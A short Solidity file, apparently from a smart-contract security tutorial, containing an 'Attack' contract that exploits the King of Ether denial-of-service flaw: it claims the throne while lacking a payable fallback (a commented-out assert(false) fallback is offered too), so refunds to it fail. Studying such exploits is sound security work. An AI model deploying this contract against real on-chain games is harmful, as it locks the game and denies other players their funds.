// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

/**
 *   该合约没有定义 receive 或 fallback 函数来接收 ETH，因此所有给该合约发送 ETH
 *   的交易将会失败。或者定义一个恶意的 fallback 函数，通过 assert(false)
 *   让所有的转账交易失败。
 * @title
 * @author Gidong
 * @dev
 */
contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // fallback() external payable {
    //     assert(false);
    // }

    /// @notice
    /// @param
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
